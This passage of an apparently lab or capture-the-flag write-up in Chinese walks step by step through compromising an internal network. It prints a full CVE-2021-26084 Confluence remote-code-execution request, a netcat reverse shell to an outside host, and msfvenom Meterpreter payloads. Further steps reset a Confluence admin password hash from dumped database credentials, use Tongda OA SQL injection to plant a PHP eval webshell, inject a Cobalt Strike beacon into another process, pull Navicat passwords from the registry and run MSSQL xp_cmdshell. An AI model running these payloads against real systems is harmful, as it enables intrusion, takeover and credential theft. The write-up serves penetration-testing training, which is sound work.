socks5</span><br><span class="line"></span><br><span class="line"><span class="section">[msf]</span></span><br><span class="line"><span class="attr">type</span> = tcp</span><br><span class="line"><span class="attr">local_ip</span> = <span class="number">127.0</span>.<span class="number">0.1</span></span><br><span class="line"><span class="attr">local_port</span> = <span class="number">5555</span></span><br><span class="line"><span class="attr">remote_port</span> = <span class="number">7002</span></span><br></pre></td></tr></table></figure>

<p>目标机器运行frpc</p>
<p><a href="https://p2.ssl.qhimg.com/t01522ece544eeac71c.png" target="_blank" rel="noopener"><img src="https://p2.ssl.qhimg.com/t01522ece544eeac71c.png" alt="img"></a></p>
<p>访问8090，发现是一个confluence，Confluence 是 Atlassian 公司出品的一款专业的企业知识管理与协同软件。</p>
<p>参考CVE-2021-26084</p>
<p>vulhub上的poc:</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/pages/doenterpagevariables.action</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: 192.168.10.129:8000</span><br><span class="line"><span class="attribute">User-Agent</span>: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:94.0) Gecko/20100101 Firefox/94.0</span><br><span class="line"><span class="attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span><br><span class="line"><span class="attribute">Accept-Language</span>: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line"><span class="attribute">Accept-Encoding</span>: gzip, deflate</span><br><span class="line"><span class="attribute">Content-Type</span>: application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Content-Length</span>: 1060</span><br><span class="line"><span class="attribute">Origin</span>: http://192.168.10.129:8000</span><br><span class="line"><span class="attribute">Connection</span>: close</span><br><span class="line"><span class="attribute">Referer</span>: http://192.168.10.129:8000/pages/doenterpagevariables.action</span><br><span class="line"><span class="attribute">Cookie</span>: JSESSIONID=67C450235CD839CF8F51DC9E4541FE44</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span>: 1</span><br><span class="line"></span><br><span class="line">queryString=%5cu0027%2b%7bClass.forName%28%5cu0027javax.script.ScriptEngineManager%5cu0027%29.newInstance%28%29.getEngineByName%28%5cu0027JavaScript%5cu0027%29.%5cu0065val%28%5cu0027var+isWin+%3d+java.lang.System.getProperty%28%5cu0022os.name%5cu0022%29.toLowerCase%28%29.contains%28%5cu0022win%5cu0022%29%3b+var+cmd+%3d+new+java.lang.String%28%5cu0022                               id                                                       %5cu0022%29%3bvar+p+%3d+new+java.lang.ProcessBuilder%28%29%3b+if%28isWin%29%7bp.command%28%5cu0022cmd.exe%5cu0022%2c+%5cu0022%2fc%5cu0022%2c+cmd%29%3b+%7d+else%7bp.command%28%5cu0022bash%5cu0022%2c+%5cu0022-c%5cu0022%2c+cmd%29%3b+%7dp.redirectErrorStream%28true%29%3b+var+process%3d+p.start%28%29%3b+var+inputStreamReader+%3d+new+java.io.InputStreamReader%28process.getInputStream%28%29%29%3b+var+bufferedReader+%3d+new+java.io.BufferedReader%28inputStreamReader%29%3b+var+line+%3d+%5cu0022%5cu0022%3b+var+output+%3d+%5cu0022%5cu0022%3b+while%28%28line+%3d+bufferedReader.readLine%28%29%29+%21%3d+null%29%7boutput+%3d+output+%2b+line+%2b+java.lang.Character.toString%2810%29%3b+%7d%5cu0027%29%7d%2b%5cu0027</span><br></pre></td></tr></table></figure>

<p><a href="https://p1.ssl.qhimg.com/t0150c78be294cf3e9f.png" target="_blank" rel="noopener"><img src="https://p1.ssl.qhimg.com/t0150c78be294cf3e9f.png" alt="img"></a></p>
<p> 这里发现发现机器是centos,在linux上Confluence的默认权限为confluence，没有写权限，所以我们这里没办法直接写webshell了。但是这里可以利用centos上的nc先拿到一共shell进行操作。</p>
<p>上传lcx.exe进行端口转发</p>
<figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">start /min lcx.exe -tran <span class="number">7777</span> <span class="number">172.168</span><span class="number">.1</span><span class="number">.128</span> <span class="number">3333</span></span><br></pre></td></tr></table></figure>

<p><a href="https://p5.ssl.qhimg.com/t01a58dd09072b3c53a.png" target="_blank" rel="noopener"><img src="https://p5.ssl.qhimg.com/t01a58dd09072b3c53a.png" alt="img"></a></p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/pages/doenterpagevariables.action</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: 192.168.10.129:8000</span><br><span class="line"><span class="attribute">User-Agent</span>: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:94.0) Gecko/20100101 Firefox/94.0</span><br><span class="line"><span class="attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span><br><span class="line"><span class="attribute">Accept-Language</span>: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line"><span class="attribute">Accept-Encoding</span>: gzip, deflate</span><br><span class="line"><span class="attribute">Content-Type</span>: application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Content-Length</span>: 1159</span><br><span class="line"><span class="attribute">Origin</span>: http://192.168.10.129:8000</span><br><span class="line"><span class="attribute">Connection</span>: close</span><br><span class="line"><span class="attribute">Referer</span>: http://192.168.10.129:8000/pages/doenterpagevariables.action</span><br><span class="line"><span class="attribute">Cookie</span>: JSESSIONID=67C450235CD839CF8F51DC9E4541FE44</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span>: 1</span><br><span class="line"></span><br><span class="line">queryString=%5cu0027%2b%7bClass.forName%28%5cu0027javax.script.ScriptEngineManager%5cu0027%29.newInstance%28%29.getEngineByName%28%5cu0027JavaScript%5cu0027%29.%5cu0065val%28%5cu0027var+isWin+%3d+java.lang.System.getProperty%28%5cu0022os.name%5cu0022%29.toLowerCase%28%29.contains%28%5cu0022win%5cu0022%29%3b+var+cmd+%3d+new+java.lang.String%28%5cu0022                            nc -e /bin/bash 10.1.16.68 7777                                          %5cu0022%29%3bvar+p+%3d+new+java.lang.ProcessBuilder%28%29%3b+if%28isWin%29%7bp.command%28%5cu0022cmd.exe%5cu0022%2c+%5cu0022%2fc%5cu0022%2c+cmd%29%3b+%7d+else%7bp.command%28%5cu0022bash%5cu0022%2c+%5cu0022-c%5cu0022%2c+cmd%29%3b+%7dp.redirectErrorStream%28true%29%3b+var+process%3d+p.start%28%29%3b+var+inputStreamReader+%3d+new+java.io.InputStreamReader%28process.getInputStream%28%29%29%3b+var+bufferedReader+%3d+new+java.io.BufferedReader%28inputStreamReader%29%3b+var+line+%3d+%5cu0022%5cu0022%3b+var+output+%3d+%5cu0022%5cu0022%3b+while%28%28line+%3d+bufferedReader.readLine%28%29%29+%21%3d+null%29%7boutput+%3d+output+%2b+line+%2b+java.lang.Character.toString%2810%29%3b+%7d%5cu0027%29%7d%2b%5cu0027</span><br></pre></td></tr></table></figure>

<p><a href="https://p3.ssl.qhimg.com/t01b3af951a3ea037fe.png" target="_blank" rel="noopener"><img src="https://p3.ssl.qhimg.com/t01b3af951a3ea037fe.png" alt="img"></a></p>
<figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -<span class="keyword">c</span> <span class="string">"import pty;pty.spawn('/bin/bash')"</span></span><br></pre></td></tr></table></figure>

<p>之后可以再上线msf，先做端口转发:</p>
<figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">start /min lcx.exe -tran <span class="number">8888</span> <span class="number">172.168</span><span class="number">.1</span><span class="number">.128</span> <span class="number">1111</span></span><br></pre></td></tr></table></figure>

<p><a href="https://p2.ssl.qhimg.com/t018feb3dc7e4bfcfb3.png" target="_blank" rel="noopener"><img src="https://p2.ssl.qhimg.com/t018feb3dc7e4bfcfb3.png" alt="img"></a></p>
<p><a href="https://p5.ssl.qhimg.com/t019ff5a3b45f3bb88c.png" target="_blank" rel="noopener"><img src="https://p5.ssl.qhimg.com/t019ff5a3b45f3bb88c.png" alt="img"></a></p>
<figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=<span class="number">10.1</span><span class="number">.16</span><span class="number">.68</span> LPORT=<span class="number">8888</span> -f elf &gt; test7002.elf</span><br></pre></td></tr></table></figure>

<p>tmp目录是所有用户共有的临时文件夹，所有用户都拥有读写权限，所以可以将elf写到/tmp下执行。</p>
<p><a href="https://p5.ssl.qhimg.com/t0126c6f4d76ffac426.png" target="_blank" rel="noopener"><img src="https://p5.ssl.qhimg.com/t0126c6f4d76ffac426.png" alt="img"></a></p>
<p><a href="https://p2.ssl.qhimg.com/t01bddf2cf13237dc27.png" target="_blank" rel="noopener"><img src="https://p2.ssl.qhimg.com/t01bddf2cf13237dc27.png" alt="img"></a></p>
<p>本机的信息收集，查看数据库账号密码:</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">cat /var/atlassian/application-data/confluence/confluence.cfg.xml</span><br><span class="line"><span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"hibernate.connection.password"</span>&gt;</span>2021ISoon!@#<span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"hibernate.connection.url"</span>&gt;</span>jdbc:mysql://localhost:3306/confluence?useUnicode=true<span class="symbol">&amp;amp;</span>characterEncoding=UTF-8<span class="symbol">&amp;amp;</span>useSSL=false<span class="symbol">&amp;amp;</span>sessionVariables=tx_isolation='READ-COMMITTED'<span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"hibernate.connection.username"</span>&gt;</span>confluenceuser<span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p><a href="https://p4.ssl.qhimg.com/t016a67c938744944e8.png" target="_blank" rel="noopener"><img src="https://p4.ssl.qhimg.com/t016a67c938744944e8.png" alt="img"></a></p>
<p>得到账号密码为</p>
<figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">confluenceuser</span>   2021ISoon!@<span class="comment">#</span></span><br></pre></td></tr></table></figure>

<p><a href="https://p1.ssl.qhimg.com/t01afd1c2de0236679c.png" target="_blank" rel="noopener"><img src="https://p1.ssl.qhimg.com/t01afd1c2de0236679c.png" alt="img"></a></p>
<p>查看用户信息</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">id</span>,user_name,credential <span class="keyword">from</span> cwd_user;</span><br></pre></td></tr></table></figure>

<p><a href="https://p5.ssl.qhimg.com/t01410b187c4fea1e01.png" target="_blank" rel="noopener"><img src="https://p5.ssl.qhimg.com/t01410b187c4fea1e01.png" alt="img"></a></p>
<p>发现confluence里的密码是加密的，但是我们这里可以重置后台账号密码:</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">UPDATE</span> cwd_user <span class="keyword">SET</span> credential= <span class="string">'&#123;PKCS5S2&#125;UokaJs5wj02LBUJABpGmkxvCX0q+IbTdaUfxy1M9tVOeI38j95MRrVxWjNCu6gsm'</span> <span class="keyword">WHERE</span> <span class="keyword">id</span> = <span class="number">229377</span>;</span><br></pre></td></tr></table></figure>

<p>之后使用isoon2021admin/123456登录后台即可</p>
<p>公告栏获得 flag。</p>
<p><a href="https://p4.ssl.qhimg.com/t0179a395737174bb32.png" target="_blank" rel="noopener"><img src="https://p4.ssl.qhimg.com/t0179a395737174bb32.png" alt="img"></a></p>
<p>得到oa用户和密码</p>
<p><a href="https://p2.ssl.qhimg.com/t01d1035e2f61dee479.png" target="_blank" rel="noopener"><img src="https://p2.ssl.qhimg.com/t01d1035e2f61dee479.png" alt="img"></a></p>
<h2 id="0x03-OA"><a href="#0x03-OA" class="headerlink" title="0x03 OA"></a>0x03 OA</h2><p>10.1.16.70</p>
<p>先看看OA的版本11.7:</p>
<p><a href="https://p0.ssl.qhimg.com/t019673373f4ac11335.png" target="_blank" rel="noopener"><img src="https://p0.ssl.qhimg.com/t019673373f4ac11335.png" alt="img"></a></p>
<p> 根据拿到的文档表，使用权限高的用户登录。11.7版本后台getshell方法有好几种:<strong>上传.user.ini</strong>、<strong>redis+SSRF组合拳</strong>、<strong>后台sql注入添加用户写weshsell</strong>，这里可以任意选择一种方式拿到webshell。</p>
<p>演示后台sql注入添加用户写weshsell，添加用户:</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://10.1.16.70/general/hr/manage/query/delete_cascade.php?condition_cascade=<span class="keyword">grant</span> <span class="keyword">all</span> <span class="keyword">privileges</span> <span class="keyword">ON</span> mysql.* <span class="keyword">TO</span> <span class="string">'cyzcc'</span>@<span class="string">'%'</span> <span class="keyword">IDENTIFIED</span> <span class="keyword">BY</span> <span class="string">'abcABC@123'</span> <span class="keyword">WITH</span> <span class="keyword">GRANT</span> <span class="keyword">OPTION</span></span><br></pre></td></tr></table></figure>

<p>远程连接</p>
<figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql -u cyzcc -p -h <span class="number">10.1</span><span class="number">.16</span><span class="number">.70</span> -P <span class="number">3336</span></span><br></pre></td></tr></table></figure>

<p><a href="https://p5.ssl.qhimg.com/t01365dde03deffe83c.png" target="_blank" rel="noopener"><img src="https://p5.ssl.qhimg.com/t01365dde03deffe83c.png" alt="img"></a></p>
<p>然后该用户是对mysql数据库拥有所有权限的,然后给自己加权限：</p>
<figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">UPDATE</span> <span class="symbol">`mysql`</span>.<span class="symbol">`user`</span> <span class="keyword">SET</span> <span class="symbol">`Password`</span> = <span class="string">'*DE0742FA79F6754E99FDB9C8D2911226A5A9051D'</span>, <span class="symbol">`Select_priv`</span> = <span class="string">'Y'</span>, <span class="symbol">`Insert_priv`</span> = <span class="string">'Y'</span>, <span class="symbol">`Update_priv`</span> = <span class="string">'Y'</span>, <span class="symbol">`Delete_priv`</span> = <span class="string">'Y'</span>, <span class="symbol">`Create_priv`</span> = <span class="string">'Y'</span>, <span class="symbol">`Drop_priv`</span> = <span class="string">'Y'</span>, <span class="symbol">`Reload_priv`</span> = <span class="string">'Y'</span>, <span class="symbol">`Shutdown_priv`</span> = <span class="string">'Y'</span>, <span class="symbol">`Process_priv`</span> = <span class="string">'Y'</span>, <span class="symbol">`File_priv`</span> = <span class="string">'Y'</span>, <span class="symbol">`Grant_priv`</span> = <span class="string">'Y'</span>, <span class="symbol">`References_priv`</span> = <span class="string">'Y'</span>, <span class="symbol">`Index_priv`</span> = <span class="string">'Y'</span>, <span class="symbol">`Alter_priv`</span> = <span class="string">'Y'</span>, <span class="symbol">`Show_db_priv`</span> = <span class="string">'Y'</span>, <span class="symbol">`Super_priv`</span> = <span class="string">'Y'</span>, <span class="symbol">`Create_tmp_table_priv`</span> = <span class="string">'Y'</span>, <span class="symbol">`Lock_tables_priv`</span> = <span class="string">'Y'</span>, <span class="symbol">`Execute_priv`</span> = <span class="string">'Y'</span>, <span class="symbol">`Repl_slave_priv`</span> = <span class="string">'Y'</span>, <span class="symbol">`Repl_client_priv`</span> = <span class="string">'Y'</span>, <span class="symbol">`Create_view_priv`</span> = <span class="string">'Y'</span>, <span class="symbol">`Show_view_priv`</span> = <span class="string">'Y'</span>, <span class="symbol">`Create_routine_priv`</span> = <span class="string">'Y'</span>, <span class="symbol">`Alter_routine_priv`</span> = <span class="string">'Y'</span>, <span class="symbol">`Create_user_priv`</span> = <span class="string">'Y'</span>, <span class="symbol">`Event_priv`</span> = <span class="string">'Y'</span>, <span class="symbol">`Trigger_priv`</span> = <span class="string">'Y'</span>, <span class="symbol">`Create_tablespace_priv`</span> = <span class="string">'Y'</span>, <span class="symbol">`ssl_type`</span> = <span class="string">''</span>, <span class="symbol">`ssl_cipher`</span> = <span class="string">''</span>, <span class="symbol">`x509_issuer`</span> = <span class="string">''</span>, <span class="symbol">`x509_subject`</span> = <span class="string">''</span>, <span class="symbol">`max_questions`</span> = <span class="number">0</span>, <span class="symbol">`max_updates`</span> = <span class="number">0</span>, <span class="symbol">`max_connections`</span> = <span class="number">0</span>, <span class="symbol">`max_user_connections`</span> = <span class="number">0</span>, <span class="symbol">`plugin`</span> = <span class="string">'mysql_native_password'</span>, <span class="symbol">`authentication_string`</span> = <span class="string">''</span>, <span class="symbol">`password_expired`</span> = <span class="string">'Y'</span> <span class="keyword">WHERE</span> <span class="symbol">`Host`</span> = <span class="keyword">Cast</span>(<span class="string">'%'</span> <span class="keyword">AS</span> <span class="keyword">Binary</span>(<span class="number">1</span>)) <span class="keyword">AND</span> <span class="symbol">`User`</span> = <span class="keyword">Cast</span>(<span class="string">'cyzcc'</span> <span class="keyword">AS</span> <span class="keyword">Binary</span>(<span class="number">5</span>));</span><br></pre></td></tr></table></figure>

<p>然后用注入点刷新权限，因为该用户是没有刷新权限的权限的：<code>general/hr/manage/query/delete_cascade.php?condition_cascade=flush privileges;</code></p>
<p><a href="https://p3.ssl.qhimg.com/t01e23361782bbf4cb7.png" target="_blank" rel="noopener"><img src="https://p3.ssl.qhimg.com/t01e23361782bbf4cb7.png" alt="img"></a></p>
<p>提示这个，或者让改密码死活改不了。再执行一下</p>
<p><a href="https://p0.ssl.qhimg.com/t010bc5781b93d050c1.png" target="_blank" rel="noopener"><img src="https://p0.ssl.qhimg.com/t010bc5781b93d050c1.png" alt="img"></a></p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">grant</span> <span class="keyword">all</span> <span class="keyword">privileges</span> <span class="keyword">ON</span> mysql.* <span class="keyword">TO</span> <span class="string">'cyzcc'</span>@<span class="string">'%'</span> <span class="keyword">IDENTIFIED</span> <span class="keyword">BY</span> <span class="string">'abcABC@123'</span> <span class="keyword">WITH</span> <span class="keyword">GRANT</span> <span class="keyword">OPTION</span></span><br></pre></td></tr></table></figure>

<p>之后就拥有了所有权限</p>
<p><a href="https://p1.ssl.qhimg.com/t01c0852929ddad08d8.png" target="_blank" rel="noopener"><img src="https://p1.ssl.qhimg.com/t01c0852929ddad08d8.png" alt="img"></a></p>
<p>写马</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 查路径：</span></span><br><span class="line"><span class="keyword">select</span> @@basedir; <span class="comment"># c:\MYOA\mysql5\，那么web目录就是c:\MYOA\webroot    # 方法1：</span></span><br><span class="line"><span class="keyword">set</span> <span class="keyword">global</span> slow_query_log=<span class="keyword">on</span>;</span><br><span class="line"><span class="keyword">set</span> <span class="keyword">global</span> slow_query_log_file=<span class="string">'C:/MYOA/webroot/cyzcc.php'</span>;</span><br><span class="line"><span class="keyword">select</span> <span class="string">'&lt;?php eval($_POST[x]);?&gt;'</span> <span class="keyword">or</span> <span class="keyword">sleep</span>(<span class="number">11</span>);</span><br><span class="line"><span class="comment"># 方法2：</span></span><br><span class="line"><span class="keyword">set</span> <span class="keyword">global</span> general_log = <span class="keyword">on</span>;</span><br><span class="line"><span class="keyword">set</span> <span class="keyword">global</span> general_log_file = <span class="string">'C:/MYOA/webroot/cyzcc.php'</span>;</span><br><span class="line"><span class="keyword">select</span> <span class="string">'&lt;?php eval($_POST[x]);?&gt;'</span>;</span><br><span class="line"><span class="keyword">show</span> <span class="keyword">variables</span> <span class="keyword">like</span> <span class="string">'%general%'</span>;</span><br></pre></td></tr></table></figure>

<p><a href="https://p5.ssl.qhimg.com/t01007ac8fdc66dd501.png" target="_blank" rel="noopener"><img src="https://p5.ssl.qhimg.com/t01007ac8fdc66dd501.png" alt="img"></a></p>
<p><a href="https://p1.ssl.qhimg.com/t0197c67e333d446b1a.png" target="_blank" rel="noopener"><img src="https://p1.ssl.qhimg.com/t0197c67e333d446b1a.png" alt="img"></a></p>
<p><a href="https://p0.ssl.qhimg.com/t01d52523628ac7677c.png" target="_blank" rel="noopener"><img src="https://p0.ssl.qhimg.com/t01d52523628ac7677c.png" alt="img"></a></p>
<p><a href="https://p4.ssl.qhimg.com/t015880097e01ed5dc7.png" target="_blank" rel="noopener"><img src="https://p4.ssl.qhimg.com/t015880097e01ed5dc7.png" alt="img"></a></p>
<p>上去是system权限，这里本来还想考察一个com组件绕过disable_functions。</p>
<p><a href="https://p3.ssl.qhimg.com/t01bbf91016a3f760cd.png" target="_blank" rel="noopener"><img src="https://p3.ssl.qhimg.com/t01bbf91016a3f760cd.png" alt="img"></a></p>
<p>上线msf,正向shell：</p>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/bind_tcp <span class="attribute">LPORT</span>=1234 -f exe  &gt; bind_shell.exe</span><br></pre></td></tr></table></figure>

<p>将bind_shell.exe上传到oa机器，运行即可收到bind shell</p>
<p><a href="https://p0.ssl.qhimg.com/t01e28fbcde11711e1d.png" target="_blank" rel="noopener"><img src="https://p0.ssl.qhimg.com/t01e28fbcde11711e1d.png" alt="img"></a></p>
<p>为了方便之后的操作，我们将shell转到CS上操作:</p>
<p>翻一下桌面找到flag:</p>
<p><a href="https://p4.ssl.qhimg.com/t013aaac66d1ca48828.png" target="_blank" rel="noopener"><img src="https://p4.ssl.qhimg.com/t013aaac66d1ca48828.png" alt="img"></a></p>
<p> 本机信息收集，在C盘根目录下看到了服务器安装了Navicat,猜测Navicat里可能保存了数据库的账号和密码。</p>
<p><a href="https://p5.ssl.qhimg.com/t01391c3be26d2cff88.png" target="_blank" rel="noopener"><img src="https://p5.ssl.qhimg.com/t01391c3be26d2cff88.png" alt="img"></a></p>
<p>Navicat 中保存的所有连接账密，都是直接存到对应注册表项值下的。</p>
<p>各个数据库连接账密具体存放位置:</p>
<figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">MySQL HKEY_CURRENT_USER<span class="tag">\<span class="name">Software</span></span><span class="tag">\<span class="name">PremiumSoft</span></span><span class="tag">\<span class="name">Navicat</span></span><span class="tag">\<span class="name">Servers</span></span><span class="tag">\</span></span><br><span class="line">MariaDB HKEY_CURRENT_USER<span class="tag">\<span class="name">Software</span></span><span class="tag">\<span class="name">PremiumSoft</span></span><span class="tag">\<span class="name">NavicatMARIADB</span></span><span class="tag">\<span class="name">Servers</span></span><span class="tag">\</span></span><br><span class="line">Microsoft SQL HKEY_CURRENT_USER<span class="tag">\<span class="name">Software</span></span><span class="tag">\<span class="name">PremiumSoft</span></span><span class="tag">\<span class="name">NavicatMSSQL</span></span><span class="tag">\<span class="name">Servers</span></span><span class="tag">\</span></span><br><span class="line">Oracle HKEY_CURRENT_USER<span class="tag">\<span class="name">Software</span></span><span class="tag">\<span class="name">PremiumSoft</span></span><span class="tag">\<span class="name">NavicatOra</span></span><span class="tag">\<span class="name">Servers</span></span><span class="tag">\</span></span><br><span class="line">PostgreSQL HKEY_CURRENT_USER<span class="tag">\<span class="name">Software</span></span><span class="tag">\<span class="name">PremiumSoft</span></span><span class="tag">\<span class="name">NavicatPG</span></span><span class="tag">\<span class="name">Servers</span></span><span class="tag">\</span></span><br><span class="line">MongoDB HKEY_CURRENT_USER<span class="tag">\<span class="name">Software</span></span><span class="tag">\<span class="name">PremiumSoft</span></span><span class="tag">\<span class="name">NavicatMongoDB</span></span></span><br><span class="line">SQLite HKEY_CURRENT_USER<span class="tag">\<span class="name">Software</span></span><span class="tag">\<span class="name">PremiumSoft</span></span><span class="tag">\<span class="name">NavicatSQLite</span></span><span class="tag">\<span class="name">Servers</span></span><span class="tag">\</span></span><br></pre></td></tr></table></figure>

<p> 但是我们这里直接在system权限下进行查询是查不到的。尝试查询当前用户的所有连接记录:</p>
<p><a href="https://p3.ssl.qhimg.com/t01047217fd287af362.png" target="_blank" rel="noopener"><img src="https://p3.ssl.qhimg.com/t01047217fd287af362.png" alt="img"></a></p>
<p> system进程、服务若要操作用户注册表（HKEY_CURRENT_USER）,如果直接操作注册表会被重定向到HKEY_USERS。所以我们这里需要进行从sys-admin的降权操作。</p>
<p>这里利用Cobalt Strike的进程注入实现降权(msf同理)：</p>
<p>查看具有administrator权限的系统进程</p>
<figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tasklist <span class="string">/v</span> <span class="string">/fo</span> list</span><br></pre></td></tr></table></figure>

<p>将Payload注入到新进程中去：</p>
<figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">inject <span class="number">5732</span> x64</span><br></pre></td></tr></table></figure>

<p>获得一个administrator权限的beacon。</p>
<p>查询mssql的连接账密</p>
<figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># reg query HKEY_CURRENT_USER<span class="symbol">\S</span>oftware<span class="symbol">\P</span>remiumSoft<span class="symbol">\N</span>avicatMSSQL<span class="symbol">\S</span>ervers<span class="symbol">\ </span>/s /v host 数据库连接 ip</span><br><span class="line"># reg query HKEY_CURRENT_USER<span class="symbol">\S</span>oftware<span class="symbol">\P</span>remiumSoft<span class="symbol">\N</span>avicatMSSQL<span class="symbol">\S</span>ervers<span class="symbol">\ </span>/s /v UserName 数据库用户名</span><br><span class="line"># reg query HKEY_CURRENT_USER<span class="symbol">\S</span>oftware<span class="symbol">\P</span>remiumSoft<span class="symbol">\N</span>avicatMSSQL<span class="symbol">\S</span>ervers<span class="symbol">\ </span>/s /v pwd 数据库用户名对应的密码 hash</span><br><span class="line"># reg query HKEY_CURRENT_USER<span class="symbol">\S</span>oftware<span class="symbol">\P</span>remiumSoft<span class="symbol">\N</span>avicatMSSQL<span class="symbol">\S</span>ervers<span class="symbol">\ </span>/s /v Port 数据库连接端口，默认 16 进制数值</span><br></pre></td></tr></table></figure>

<p>之后，我们把拿到的hash复制回来本地解密即可。</p>
<p>其实有一键化的工具可以直接跑：</p>
<p><a href="https://github.com/uknowsec/SharpDecryptPwd" target="_blank" rel="noopener">https://github.com/uknowsec/SharpDecryptPwd</a></p>
<p><a href="https://p1.ssl.qhimg.com/t0166cf5f84259f8c3a.png" target="_blank" rel="noopener"><img src="https://p1.ssl.qhimg.com/t0166cf5f84259f8c3a.png" alt="img"></a></p>
<h2 id="0x04-db-iSoon2021-lab"><a href="#0x04-db-iSoon2021-lab" class="headerlink" title="0x04 db.iSoon2021.lab"></a>0x04 db.iSoon2021.lab</h2><p> 本地挂上代理，使用navicat连接内网mssql，启用目标 mssql 的 xp_cmdshell可以执行命令。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">exec</span> master.dbo.xp_cmdshell <span class="string">'whoami'</span>;</span><br></pre></td></tr></table></figure>

<p><a href="https://p5.ssl.qhimg.com/t01a81bd20a5f96f4bb.png" target="_blank" rel="noopener"><img src="https://p5.ssl.qhimg.com/t01a81bd20a5f96f4bb.png" alt="img"></a></p>
<p> 发现权限是一个受限的service\mssql$sqlexpress服务账户权限,但是在域里，<strong>服务的权限为Local System 或 Network Service都会注册在活动目录的机器帐户下</strong>，所以我们我们这里其实已经入域了。</p>
<p><a href="https://p1.ssl.qhimg.com/t0199cce3423914ef7f.png" target="_blank" rel="noopener"><img src="https://p1.ssl.qhimg.com/t0199cce3423914ef7f.png" alt="img"></a></p>
<p>通过使用certutil.exe下载远程的可执行文件，可执行文件可以放在OA服务器或者wordpress上。</p>
